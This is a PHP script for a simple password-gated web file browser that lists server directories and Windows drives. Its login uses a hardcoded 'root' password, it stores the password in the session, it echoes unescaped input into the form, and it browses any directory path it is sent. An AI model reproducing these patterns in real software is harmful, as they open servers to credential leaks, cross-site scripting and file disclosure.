<!DOCTYPE html>
<html class="htmlid" xmlns="http://www.w3.org/1999/html">
    <head>
        <meta charset="UTF-8">
        <link rel="stylesheet" href="mrfiles/mdr.css">
        <title>mr</title>
    </head>
</html>

<?php
include_once("mrfiles/functions.php");
include_once("mrfiles/drives.php");
?>
<?php
session_start();
?>

<?php
//////// Get username and password with POST ////////
if(isset($_POST['submit']) === true)
{
    $username = $_SESSION['username'] = $_POST['username'];
    $password = $_SESSION['password'] = $_POST['password'];
    if ($_POST['username'] === 'root' && $_POST['password'] === 'masoudsam')
    {
        $login = $_SESSION['login'] = 1;
    }
    else
    {
        $login = $_SESSION['login'] = -1;
    }
}
?>

<?php
    //////// Session Control ////////
    if(isset($_SESSION['url']) === false)
    {
        $_SESSION['url'] = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
        $_SESSION['url'] = str_replace('mdr.php5','',$_SESSION['url']);
    }
    if(isset($_SESSION['login']) === false)
    {
        $login = -1;
    }
    else
    {
        $login = $_SESSION['login'];
    }
    if(isset($_SESSION['username']) === false)
    {
        $username = "";
    }
    else
    {
        $username = $_SESSION['username'];
    }
    if(isset($_SESSION['password']) === false)
    {
        $password = "";
    }
    else
    {
        $password = $_SESSION['password'];
    }
?>


<?php

    //////// check valid root ////////
    if ( $login === -1)
    {?>
        <body>
            <form method="post" action="mdr.php5" class="formmdr">
                <div><label> Username : <input type="text" name="username" value="<?php echo $username?>"></label></div>
                <div><label> Password : <input type="password" name="password" value="<?php echo $password?>"></label></div>
                <div><label> enter : <input type="submit" name="submit" value="admin"></label></div>
            </form>
        </body>

<?php
    }
?>

<?php
if(isset($_POST['submit']) === true && $login === -1)
{
?>
    <div style="padding: 10px"><h2>try agian username and password</h2></div>
<?php
}

if($login === -1)
{
    die();
}
?>


<form method="post" class="mch">
    <input type="submit" name="mcd" value="change drive(windows)">
</form>
<?php
if(isset($_POST['mdir']) === true)
{
    m($_POST['mdir']);
}
else
{
    m('.');
}
?>
<?php
if(isset($_POST['mcd']) === true)
{
    ?>
    <ol>
    <?php
    $mdrive = mdrives();
    foreach($mdrive as $drive)
    {
        ?>
        <li><?php echo $drive?></li>
        <?php
    }
    ?>
    </ol>
    <?php
}
?>